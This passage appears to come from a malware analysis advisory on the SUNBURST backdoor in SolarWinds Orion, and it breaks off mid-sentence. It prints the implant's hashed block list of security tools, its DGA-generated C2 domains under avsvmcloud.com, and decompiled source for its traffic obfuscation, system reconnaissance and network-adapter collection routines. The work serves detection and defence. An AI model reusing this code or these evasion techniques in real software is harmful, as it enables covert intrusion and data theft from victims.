\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 emea.sales\n\t\t\t17939405613729073960 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0epfw\n\t\t\t17997967489723066537 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0epfwwfp\n\t\t\t3778500091710709090 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 evidence center\n\t\t\t8799118153397725683 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 exeinfope\n\t\t\t8873858923435176895 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 expect\n\t\t\t13783346438774742614 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0f-secure filter\n\t\t\t16112751343173365533 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0f-secure gatekeeper\n\t\t\t17624147599670377042 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0f-secure gatekeeper handler starter\n\t\t\t3425260965299690882 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 f-secure hips\n\t\t\t16066651430762394116 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0f-secure network request broker\n\t\t\t2380224015317016190 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 f-secure recognizer\n\t\t\t13655261125244647696 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0f-secure webui daemon\n\t\t\t12027963942392743532 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fakedns\n\t\t\t576626207276463000 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fakenet\n\t\t\t9384605490088500348 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fe_avk\n\t\t\t15092207615430402812 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0feelam\n\t\t\t6274014997237900919 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fekern\n\t\t\t3320767229281015341 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fewscservice\n\t\t\t7412338704062093516 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ffdec\n\t\t\t682250828679635420 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fiddler\n\t\t\t13014156621614176974 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fileinsight\n\t\t\t18150909006539876521 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0floss\n\t\t\t5587557070429522647 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fnrb32\n\t\t\t12445177985737237804 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsaua\n\t\t\t12445232961318634374 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsaus\n\t\t\t17017923349298346219 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsav32\n\t\t\t9333057603143916814 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsbts\n\t\t\t541172992193764396 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsdevcon\n\t\t\t10393903804869831898 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsdfw\n\t\t\t3413052607651207697 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fses\n\t\t\t3407972863931386250 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsfw\n\t\t\t10545868833523019926 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsgk32\n\t\t\t521157249538507889 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsgk32st\n\t\t\t3421213182954201407 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsma\n\t\t\t15039834196857999838 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsma32\n\t\t\t3421197789791424393 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsms\n\t\t\t3413886037471417852 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsni\n\t\t\t17978774977754553159 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsorsp\n\t\t\t14243671177281069512 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fsorspclient\n\t\t\t14055243717250701608 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fssm32\n\t\t\t7315838824213522000 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fsvista\n\t\t\t14971809093655817917 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0fswebuid\n\t\t\t10336842116636872171 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0gdb\n\t\t\t6943102301517884811 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 groundling32.sys\n\t\t\t13544031715334011032 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0groundling64.sys\n\t\t\t397780960855462669 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0hexisfsmonitor.sys\n\t\t\t13260224381505715848 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0hiew32\n\t\t\t12785322942775634499 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0hiew32demo\n\t\t\t17956969551821596225 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0hollows_hunter\n\t\t\t14256853800858727521 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0idaq\n\t\t\t8709004393777297355 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 idaq64\n\t\t\t8129411991672431889 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 idr\n\t\t\t15514036435533858158 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if-modified-since\n\t\t\t15997665423159927228 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ildasm\n\t\t\t10829648878147112121 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ilspy\n\t\t\t9149947745824492274 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 jd-gui\n\t\t\t13852439084267373191 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0keep-alive\n\t\t\t17633734304611248415 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ksde\n\t\t\t13581776705111912829 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ksdeui\n\t\t\t4578480846255629462 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lab.brno\n\t\t\t8381292265993977266 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lab.local\n\t\t\t3796405623695665524 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lab.na\n\t\t\t5942282052525294911 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lab.rio\n\t\t\t17984632978012874803 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0libwamf.sys\n\t\t\t3656637464651387014 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lordpe\n\t\t\t2717025511528702475 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 lragentmf.sys\n\t\t\t10501212300031893463 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0microsoft.tri.sensor\n\t\t\t155978580751494388 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0microsoft.tri.sensor.updater\n\t\t\t5183687599225757871 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 msmpeng\n\t\t\t10063651499895178962 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0mssense\n\t\t\t3575761800716667678 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 officemalscanner\n\t\t\t4501656691368064027 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ollydbg\n\t\t\t7701683279824397773 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 pci.local\n\t\t\t10296494671777307979 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0pdfstreamdumper\n\t\t\t14630721578341374856 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0pe-bear\n\t\t\t6461429591783621719 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 pe-sieve32\n\t\t\t6508141243778577344 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 pe-sieve64\n\t\t\t4088976323439621041 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 pebrowse64\n\t\t\t9531326785919727076 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 peid\n\t\t\t10235971842993272939 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0pestudio\n\t\t\t2478231962306073784 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 peview\n\t\t\t9903758755917170407 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 pexplorer\n\t\t\t14710585101020280896 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ppee\n\t\t\t2810460305047003196 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 procdump\n\t\t\t13611814135072561278 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0procdump64\n\t\t\t2032008861530788751 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 processhacker\n\t\t\t6491986958834001955 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 procexp\n\t\t\t27407921587843457 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 procexp64\n\t\t\t2128122064571842954 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 procmon\n\t\t\t10484659978517092504 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0prodiscoverbasic\n\t\t\t2532538262737333146 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 psanhost\n\t\t\t835151375515278827 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0psepfilter.sys\n\t\t\t6088115528707848728 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 psuamain\n\t\t\t4454255944391929578 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 psuaservice\n\t\t\t8478833628889826985 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 py2exedecompiler\n\t\t\t10463926208560207521 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0r2agent\n\t\t\t7080175711202577138 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 rabin2\n\t\t\t8697424601205169055 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 radare2\n\t\t\t16130138450758310172 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ramcapture\n\t\t\t7775177810774851294 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ramcapture64\n\t\t\t700598796416086955 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0redcloak\n\t\t\t9007106680104765185 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 referer\n\t\t\t506634811745884560 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0reflector\n\t\t\t18294908219222222902 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0regmon\n\t\t\t3588624367609827560 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 resourcehacker\n\t\t\t9555688264681862794 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-ar-extractor\n\t\t\t5415426428750045503 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-bin2llvmir\n\t\t\t3642525650883269872 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-bin2pat\n\t\t\t13135068273077306806 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0retdec-config\n\t\t\t3769837838875367802 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-fileinfo\n\t\t\t191060519014405309 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0retdec-getsig\n\t\t\t1682585410644922036 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-idr2pat\n\t\t\t7878537243757499832 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-llvmir2hll\n\t\t\t13799353263187722717 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0retdec-macho-extractor\n\t\t\t1367627386496056834 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-pat2yara\n\t\t\t12574535824074203265 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0retdec-stacofin\n\t\t\t16990567851129491937 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0retdec-unpacker\n\t\t\t8994091295115840290 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 retdec-yarac\n\t\t\t13876356431472225791 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0rundotnetdll\n\t\t\t18392881921099771407 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0rvsavd.sys\n\t\t\t5132256620104998637 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 saas.swi\n\t\t\t11801746708619571308 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0safe-agent.sys\n\t\t\t14968320160131875803 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sbiesvc\n\t\t\t14868920869169964081 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0scdbg\n\t\t\t106672141413120087 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0scylla_x64\n\t\t\t79089792725215063 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 scylla_x86\n\t\t\t16335643316870329598 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sense\n\t\t\t12343334044036541897 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sentinelmonitor.sys\n\t\t\t5614586596107908838 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 shellcode_launcher\n\t\t\t17291806236368054941 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0solarwinds.businesslayerhost\n\t\t\t3869935012404164040 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 solarwindsdiagnostics\n\t\t\t15267980678929160412 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0swdev.dmz\n\t\t\t1109067043404435916 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 swdev.local\n\t\t\t14111374107076822891 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0sysmon\n\t\t\t3538022140597504361 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 sysmon64\n\t\t\t7175363135479931834 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 tanium\n\t\t\t3178468437029279937 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 taniumclient\n\t\t\t13599785766252827703 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0taniumdetectengine\n\t\t\t6180361713414290679 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 taniumendpointindex\n\t\t\t8612208440357175863 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 taniumtracecli\n\t\t\t8408095252303317471 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 taniumtracewebsocketclient64\n\t\t\t7982848972385914508 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 task explorer\n\t\t\t8760312338504300643 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 task explorer-64\n\t\t\t17351543633914244545 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0tcpdump\n\t\t\t7516148236133302073 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 tcpvcon\n\t\t\t15114163911481793350 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0tcpview\n\t\t\t7574774749059321801 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 user-agent\n\t\t\t15457732070353984570 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0vboxservice\n\t\t\t16292685861617888592 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0win32_remote\n\t\t\t10374841591685794123 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0win64_remotex64\n\t\t\t3045986759481489935 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 windbg\n\t\t\t917638920165491138 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0windefend\n\t\t\t17109238199226571972 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0windump\n\t\t\t5945487981219695001 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 winhex\n\t\t\t6827032273910657891 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 winhex64\n\t\t\t8052533790968282297 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 winobj\n\t\t\t17574002783607647274 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0wireshark\n\t\t\t3341747963119755850 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 x32dbg\n\t\t\t14193859431895170587 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0x64dbg\n\t\t\t15695338751700748390 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0xagt\n\t\t\t640589622539783622 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0xagtnotif\n\t\t\t17683972236092287897 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0xwforensics\n\t\t\t17439059603042731363 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0xwforensics64\n\t\t\t--End hard-coded list of block-listed processes and names--\n\n\n\t\t\t**COMMAND AND CONTROL**\n\t\t\tDuring runtime, SUNBURST hashes its own parent process name, and compares it to the value 17291806236368054941. If it does not match, the malicious class \u201cOrionImprovementBusinessLayer\u201d will stop executing and the DLL will continue normal activity.\n\n\t\t\tWhen communicating with its C2, SUNBURST utilizes the Orion Improvement Program (OIP) protocol to disguise network activity as normal SolarWinds Orion traffic. The connection with the C2 server will contain a randomly generated \u201ccustomer ID\" that allows the adversary to track different compromised systems.\n\n\t\t\tTo establish C2, it will construct and resolve the subdomains of \"avsvmcloud.com\" using a domain generation algorithm (DGA). The following format is used to generate the domain name:\n\n\t\t\t--Begin format of the domain name--\n\t\t\t.appsync-api.eu-west-1.avsvmcloud.com\n\t\t\t.appsync-api.us-west-2.avsvmcloud.com\n\t\t\t.appsync-api.us-east-1.avsvmcloud.com\n\t\t\t.appsync-api.us-east-2.avsvmcloud.com\n\t\t\t--End format of the domain name--\n\n\t\t\tIt will attempt to make a Canonical Name (CNAME) query according to different third-level domain names in combination with the DGA to verify the C2 server is accessible before executing its command control session.\n\n\t\t\t--Begin domain names combined with DGA--\n\t\t\t6a57jk2ba1d9keg15cbg.appsync-api.eu-west-1.avsvmcloud.com\n\t\t\t7sbvaemscs0mc925tb99.appsync-api.us-west-2.avsvmcloud.com\n\t\t\tgq1h856599gqh538acqn.appsync-api.us-west-2.avsvmcloud.com\n\t\t\tihvpgv9psvq02ffo77et.appsync-api.us-east-2.avsvmcloud.com\n\t\t\tk5kcubuassl3alrf7gm3.appsync-api.eu-west-1.avsvmcloud.com\n\t\t\tmhdosoksaccf9sni9icp.appsync-api.eu-west-1.avsvmcloud.com\n\t\t\t--End domain names plus DGA--\n\n\t\t\tOutbound communications are encrypted using an embedded class named \u201cCryptoHelper.\u201d The class contains two functions named \u201cCreateSecureString\u201d and \u201cBase64Encode.\u201d The function \u201cCreateSecureString\u201d creates a random byte and then utilizes this random byte to encode the string provided. The randomly generated byte, used as the XOR key, will be stored at offset 0x00 of the encoded string -- allowing the adversary to decrypt the traffic received from this implant. The function \u201cCreateSecureString\u201d takes two arguments, a byte array which will be the data targeted for encryption and a bool variable. If this variable is set to \"true\" the function will \u201cOR\u201d the generated \u201cXOR\u201d key byte with the value 128 before using it to XOR encode the provided data. It then calls the Base64Encode function to further obfuscate the communication.\n\n\t\t\t--Begin CreateSecureString Function--\n\t\t\tprivate static string CreateSecureString(byte[] data, bool flag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0byte[] bytes = new byte[data.Length + 1];\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bytes[0] = (byte)new Random().Next(1, (int)sbyte.MaxValue);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (flag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bytes[0] |= (byte)128;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for (int index = 1; index &lt; bytes.Length; ++index)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bytes[index] = (byte)((uint)data[index - 1] ^ (uint)bytes[0]);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return Base64Encode(bytes, true);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t--End CreateSecureString Function--\n\n\n\t\t\tThe Base64Encode function is a modified version of the Base64 algorithm that uses the custom alphabet, \"ph2eifo3n5utg1j8d94qrvbmk0sal76c.\u201d This custom Base64 encoding makes it harder to interpret network traffic sent between this malicious implant and the remote C2 server. The custom Base64 alphabet and algorithm utilized would be required to decode the network traffic.\n\n\t\t\t--Begin Base64Encode Function--\n\t\t\tprivate static string Base64Encode(byte[] bytes, bool rt)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string str1 = OrionImprovementBusinessLayer.ZipHelper.Unzip(\"K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0string str2 = \"\";\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0uint num1 = 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0int num2 = 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0foreach (byte num3 in bytes)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 num1 |= (uint) num3 &lt;&lt; num2;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 for (num2 += 8; num2 &gt;= 5; num2 -= 5)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0str2 += str1[(int) num1 &amp; 31].ToString();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0num1 &gt;&gt;= 5;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (num2 &gt; 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (rt)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0num1 |= (uint) (new Random().Next() &lt;&lt; num2);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 str2 += str1[(int) num1 &amp; 31].ToString();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return str2;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t--End Base64Encode Function--\n\n\n\n\t\t\t**COLLECT SYSTEM INFORMATION**\n\t\t\tThe collection of system description info is carried out by the CollectSystemDescription function.\n\t\t\tIt will collect the following information:\n\n\t\t\tVictim domain SID\n\t\t\tDomain name\n\t\t\tHostname\n\t\t\tUsername\n\t\t\tOperating System (OS) version\n\t\t\tSystem directory\n\t\t\tEnvironment tick count - the time since the system was last rebooted.\n\n\t\t\tpublic static void CollectSystemDescription(string info, out string result)\n\t\t\t{\n\t\t\tresult = (string) null;\n\t\t\tint i = 0;\n\t\t\tstring domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tdomainName;\n\t\t\ttry\n\t\t\t{\n\t\t\tstring str = ((SecurityIdentifier) new NTAccount(domainName,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(Administrator)).Translate(typeof\n\t\t\t(SecurityIdentifier))).AccountDomainSid.ToString();\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tstr;\n\t\t\t}\n\t\t\tcatch\n\t\t\t{\n\t\t\tresult += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i);\n\t\t\t}\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tIPGlobalProperties.GetIPGlobalProperties().HostName;\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tEnvironment.UserName;\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tOrionImprovementBusinessLayer.GetOSVersion(true);\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\tEnvironment.SystemDirectory;\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) +\n\t\t\t(object) (int) TimeSpan.FromMilliseconds((double) (uint)\n\t\t\tEnvironment.TickCount).TotalDays;\n\t\t\tresult = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + info\n\t\t\t+ \"\\n\";\n\t\t\tresult += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();\n\t\t\t}\n\n\n\t\t\tThe GetNetworkAdapterConfiguration function will gather information on any attached network adapters and their configuration information.\n\n\t\t\tprivate static string GetNetworkAdapterConfiguration()\n\t\t\t{\n\t\t\tstring str = \"\";\n\t\t\ttry\n\t\t\t{\n\t\t\tusing (ManagementObjectSearcher managementObjectSearcher = new\n\t\t\tManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip(Select *\n\t\t\tFrom Win32_NetworkAdapterConfiguration where IPEnabled=true)))\n\t\t\t{\n\t\t\tforeach (ManagementObject managementObject in\n\t\t\tmanagementObjectSearcher.Get().Cast<ManagementObject>())\n\t\t\t{\n\t\t\tstr += \"\\n\";\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(Description));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(MACAddress));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DHCPEnabled));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DHCPServer));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DNSHostName));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DNSDomainSuffixSearchOrder));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DNSServerSearchOrder));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(IPAddress));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(IPSubnet));\n\t\t\tstr +=\n\t\t\tOrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject,\n\t\t\tOrionImprovementBusinessLayer.ZipHelper.Unzip(DefaultIPGateway));\n\t\t\t}\n\t\t\treturn str;\n\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception ex)\n\t\t\t{\n\t\t\treturn str + ex.Message;\n\t\t\t}\n\n\n\t\t\t**UPLOAD SYSTEM INFORMATION**\n\t\t\tThe \u201cUploadSystemDescription\u201d function is used to exfiltrate gathered system information. It parses through HTTP session information to form a full HTTP request that is sent to the remote C2 server. The modified version of the FNV-1a hash algorithm is utilized to hash certain words associated with outbound HTTP requests, such as \u201caccept\u201d (Hash: 2734787258623754862) and \u201ccontent-type\u201d (Hash: 6116246686670134098). It then parses through the provided HTTP session data using these hash values, rather than HTTP strings, to obfuscate the functionality of this code. This obfuscation 